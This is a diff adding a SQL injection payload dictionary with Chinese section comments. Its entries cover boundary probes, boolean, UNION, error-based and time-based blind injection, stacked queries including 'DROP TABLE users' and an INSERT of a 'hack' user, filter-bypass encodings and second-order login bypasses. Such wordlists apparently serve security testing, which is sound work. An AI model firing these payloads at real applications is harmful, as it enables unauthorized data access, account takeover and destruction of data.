@@ -1,0 +1,78 @@
+# SQL 注入 Payload 字典
+# 格式：每行一个 payload，# 开头为注释
+
+# ── 基础探测 ──
+'
+"
+`
+')
+")
+'))
+--
+--+
+#
+/*
+/*!
+;--
+;#
+
+# ── 布尔测试 ──
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+' OR 1=1--
+' OR 1=1#
+" OR "1"="1
+" OR 1=1--
+1' AND '1'='1
+1' AND '1'='2
+1 AND 1=1
+1 AND 1=2
+1 AND 1=1--
+1 AND 1=2--
+
+# ── UNION 探测 ──
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION ALL SELECT NULL--
+
+# ── 错误回显 ──
+' AND extractvalue(1,concat(0x7e,version(),0x7e))--
+' AND updatexml(1,concat(0x7e,version(),0x7e),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+1' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--
+
+# ── 时间盲注 ──
+' AND SLEEP(5)--
+' AND SLEEP(5)#
+' OR SLEEP(5)--
+1; SELECT SLEEP(5)
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+'; WAITFOR DELAY '0:0:5'--
+'; SELECT pg_sleep(5)--
+
+# ── 堆叠查询 ──
+'; SELECT 1--
+'; DROP TABLE users--
+'; INSERT INTO users VALUES('hack','hack')--
+
+# ── 绕过过滤 ──
+' oR '1'='1
+' Or '1'='1
+'/**/OR/**/1=1--
+' /*!OR*/ '1'='1
+'||'1'='1
+' OR 'unusual'='unusual
+1' AND 1=1 UNION SELECT 1,2,3--
+%27 OR %271%27=%271
+%2527 OR %25271%2527=%25271
+
+# ── 二阶注入 ──
+admin'--
+admin'#
+' OR 1=1 LIMIT 1--
